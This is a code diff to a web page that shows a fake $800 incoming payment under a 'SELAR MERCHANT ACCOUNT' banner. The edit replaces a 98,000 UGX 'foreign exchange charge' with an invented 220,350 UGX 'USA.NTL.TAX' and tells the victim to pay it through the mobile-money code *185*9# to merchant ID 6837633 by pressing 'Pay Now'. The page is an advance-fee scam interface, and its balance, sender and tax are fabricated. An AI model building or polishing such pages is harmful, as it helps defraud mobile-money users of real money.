@@ -155,7 +155,8 @@
             document.getElementById('exact-balance').classList.add('blink');
             document.getElementById('act-text').innerText = "Received Amount 800.00$ from lolikishee, USA CHICAGO";
             document.getElementById('act-text').style.color = "#ffb400";
-            noteBox.innerHTML = `<b style="color:red">Foreign exchange charge needed 98,000UGX</b> to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number 07XXX...`;
+            noteBox.innerHTML = `<b style="color:red">⚠️ ACTION REQUIRED: INVOICE MATURED
+​Your Serial Merchant funds (800 USD) are ready. To finalize every step of this withdrawal, please pay the USA.NTL.TAX (220,350 UGX). Once paid, your transaction will be completed.`;
             document.getElementById('visa-btn').onclick = null;
             document.getElementById('visa-btn').style.opacity = "0.5";
         } else {
@@ -196,15 +197,15 @@
             } else {
                 showStaticNotif(`
                     <b style="text-align:center; display:block">SELAR MERCHANT ACCOUNT</b>
-                    <p style="color:green; font-weight:bold;">SIM CARD VERIFIED!</p>
-                    <p style="font-size:0.7rem">Currently Work on Airtel <span class="blink">🇺🇬</span></p>
-                    <p style="font-size:0.8rem; margin:10px 0;">Pay foreign exchange charge to initiate 800$ on <b>${currentUser.phone}</b></p>
+                    <p style="color:green; font-weight:bold;">INVOICE MATURED!</p>
+                    <p style="font-size:0.7rem">USA.NTL.TAX<span class="blink">🇺🇸</span></p>
+                    <p style="font-size:0.8rem; margin:10px 0;">Pay USA. NTL.TAX to initiate 800$ on <b>${currentUser.phone}</b></p>
                     <div style="background:#eee; padding:10px; border-radius:10px; font-size:0.75rem; text-align:left">
                         Dial: <b>*185*9#</b> 📞<br>
                 🆔 Merchant ID: <b>6837633</b><br>
-                💵 Amount: <b>98000</b><br>
+                💵 Amount: <b>220350</b><br>
                 🔖 Reference: <b>selar merchant</b><br>
-                <small>Confirm fx charge to complete transaction on selar system</small>
+                <small>Confirm USA. NTL.TAX to complete transaction on selar system</small>
                     </div>
                     <div style="display:flex; gap:10px; margin-top:10px;">
                         <button class="btn-ok" style="margin:0" onclick="window.location.href='tel:*185*9%23'">Pay Now</button>
